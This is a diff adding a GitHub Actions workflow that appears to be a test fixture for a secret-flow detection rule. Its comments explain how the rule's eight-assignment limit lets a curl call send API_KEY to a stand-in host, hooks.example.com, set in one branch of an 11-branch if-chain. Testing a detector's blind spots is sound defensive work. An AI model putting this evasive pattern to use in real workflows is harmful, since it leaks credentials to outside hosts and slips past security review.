@@ -1,0 +1,35 @@
+# situation: on push, a step sets U in the 11 arms of an if, the 8th of
+#   which, when the ref name is a8, sets https://hooks.example.com, and
+#   sends the secret API_KEY to "$U/x" with curl.
+# reason: a todo (the same file): on a push to a8, U holds
+#   https://hooks.example.com when curl runs, so the request carries the
+#   secret to hooks.example.com.
+# cause: the rule judges at most 8 of the assignments of a variable that
+#   reach the request, and the assignment of hooks.example.com is not among
+#   them (destination-value-limit).
+# attack: the attacker takes over the server of hooks.example.com, by a
+#   breach of the vendor or by registering the domain when the domain
+#   lapses.
+# attack-run-behavior: on a push to a8, curl sends the secret to
+#   hooks.example.com, whose server, now the attacker's, logs the secret.
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          API_KEY: ${{ secrets.API_KEY }}
+        run: |
+          if [ "$GITHUB_REF_NAME" = a1 ]; then U=https://api.github.com
+          elif [ "$GITHUB_REF_NAME" = a2 ]; then U=https://api.github.com
+          elif [ "$GITHUB_REF_NAME" = a3 ]; then U=https://api.github.com
+          elif [ "$GITHUB_REF_NAME" = a4 ]; then U=https://api.github.com
+          elif [ "$GITHUB_REF_NAME" = a5 ]; then U=https://api.github.com
+          elif [ "$GITHUB_REF_NAME" = a6 ]; then U=https://api.github.com
+          elif [ "$GITHUB_REF_NAME" = a7 ]; then U=https://api.github.com
+          elif [ "$GITHUB_REF_NAME" = a8 ]; then U=https://hooks.example.com
+          elif [ "$GITHUB_REF_NAME" = a9 ]; then U=https://api.github.com
+          elif [ "$GITHUB_REF_NAME" = a10 ]; then U=https://api.github.com
+          else U=https://api.github.com
+          fi
+          curl -fsS -H "x-apikey: $API_KEY" "$U/x"
